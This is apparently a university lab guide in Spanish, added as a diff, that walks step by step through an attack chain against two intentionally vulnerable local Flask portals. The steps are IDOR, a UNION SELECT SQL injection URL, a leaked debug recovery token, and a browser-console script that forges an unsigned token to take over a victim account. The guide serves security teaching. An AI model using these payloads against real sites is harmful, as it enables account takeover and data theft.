@@ -1,0 +1,137 @@
+FORT KNOX — Como probar la cadena de ataque
+UTN FRBA - K5061 - Grupo 4 - 2026
+============================================
+
+REQUISITOS
+----------
+- Tener Python 3.10+ instalado
+- Abrir DOS terminales
+
+LEVANTAR LAS APPS
+-----------------
+
+Terminal 1 — Portal de Clientes (puerto 5000):
+  cd clientes
+  python -m pip install flask   (solo la primera vez)
+  python seed.py                (solo la primera vez)
+  python app.py
+
+Terminal 2 — Portal de Seguimiento (puerto 5001):
+  cd tracking
+  python -m pip install flask   (solo la primera vez)
+  python seed.py                (solo la primera vez)
+  python app.py
+
+O con Docker (una sola terminal):
+  docker compose up --build
+
+
+PASO A PASO EN EL BROWSER
+--------------------------
+
+PASO 0 — Verificar que sin cookie no se puede entrar al tracking
+  Abrir ventana de incognito y navegar a:
+    http://localhost:5001
+  Resultado esperado: redirige al login con "cookie de sesion no encontrada"
+
+
+PASO 1 — Login como atacante (crea la cookie SSO)
+  Navegar a:
+    http://localhost:5000/login
+  Ingresar:
+    Usuario:    attacker
+    Contrasena: FK2026!
+  Resultado esperado: dashboard con el pedido de Juan Atacante (Cadena de Plata)
+
+  Por que importa: al loguearse en el portal de clientes se crea la cookie fk_session,
+  que tambien es valida en el portal de seguimiento porque ambos comparten el mismo
+  secret_key.
+
+
+PASO 2 — IDOR: ver el envio de la victima  [Vulnerabilidad A01]
+  Navegar al propio envio:
+    http://localhost:5001/tracking?shipment_id=4829163
+  Ver que muestra el envio del atacante.
+
+  Cambiar el ID en la URL al de la victima:
+    http://localhost:5001/tracking?shipment_id=3847291
+  Resultado esperado: datos de Carlos Gomez (nombre, email, orden) sin ser el dueno del envio.
+
+  Dato obtenido: user_id = 1, email = carlos.gomez@gmail.com
+
+  Por que funciona: el servidor valida que haya sesion activa pero no verifica
+  que el shipment_id pertenezca al usuario autenticado.
+
+
+PASO 3 — SQL Injection: extraer el username  [Vulnerabilidad A05]
+  Busqueda normal con el user_id obtenido:
+    http://localhost:5001/support/search?user_id=1
+  Devuelve: Carlos, Gomez, carlos.gomez@gmail.com
+
+  Ahora inyectar en el parametro user_id:
+    http://localhost:5001/support/search?user_id=1 UNION SELECT id,username,first_name,last_name FROM users WHERE id=1--
+  Resultado esperado: aparece una segunda fila con "carlos_gomez" en la columna Nombre.
+
+  Dato obtenido: username = carlos_gomez
+
+  Por que funciona: el backend concatena el parametro directamente en la query SQL
+  sin usar consultas parametrizadas, permitiendo inyectar un UNION SELECT.
+
+
+PASO 4 — Security Misconfiguration: obtener el token de recuperacion  [Vulnerabilidad A02]
+  Navegar a:
+    http://localhost:5000/account/recover
+  Ingresar:
+    Usuario: carlos_gomez
+  Resultado esperado: pagina con bloque negro que muestra:
+    [DEBUG] recovery_token: eyJ...
+
+  Copiar ese token.
+
+  Por que funciona: el desarrollador dejo un campo de debug en la respuesta HTTP.
+  En produccion ese token solo deberia enviarse por email al dueno de la cuenta.
+
+
+PASO 5 — Token Tampering: tomar el control de la cuenta  [Vulnerabilidad A08]
+  Abrir la consola del browser (F12) y pegar el siguiente codigo
+  reemplazando TOKEN_AQUI con el token copiado en el paso anterior:
+
+  ---
+  const token = "TOKEN_AQUI";
+  const padded = token + "=".repeat((4 - token.length % 4) % 4);
+  const payload = JSON.parse(atob(padded.replace(/-/g, '+').replace(/_/g, '/')));
+  console.log("Original:", JSON.stringify(payload));
+  payload.authorized_email = "attacker@mailinator.com";
+  const tampered = btoa(JSON.stringify(payload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+  console.log("Tampered:", tampered);
+  window.location = "http://localhost:5000/account/confirm-recovery?token=" + tampered;
+  ---
+
+  Resultado esperado: pantalla "Acceso concedido" con sesion iniciada como carlos_gomez
+  y email actualizado a attacker@mailinator.com.
+
+  Por que funciona: el token es JSON codificado en base64url sin ninguna firma ni HMAC.
+  El servidor decodifica el token y acepta su contenido sin verificar integridad,
+  por lo que cualquier modificacion al payload es aceptada como valida.
+
+
+RESULTADO FINAL
+---------------
+El atacante tiene acceso total a la cuenta de carlos_gomez.
+La cadena completa uso 4 vulnerabilidades encadenadas:
+  A01 (IDOR)     -> user_id y email de la victima
+  A05 (SQLi)     -> username de la victima
+  A02 (Misconfig)-> token de recuperacion en la respuesta
+  A08 (Tampering)-> acceso a la cuenta sin conocer la contrasena
+
+
+USUARIOS DE PRUEBA
+------------------
+Portal de Clientes (localhost:5000):
+  carlos_gomez / FK2026!  <- victima
+  attacker     / FK2026!  <- atacante
+
+Portal de Seguimiento (localhost:5001):
+  (sin login propio, usa la cookie SSO del portal de clientes)
+  shipment victima:   3847291
+  shipment atacante:  4829163
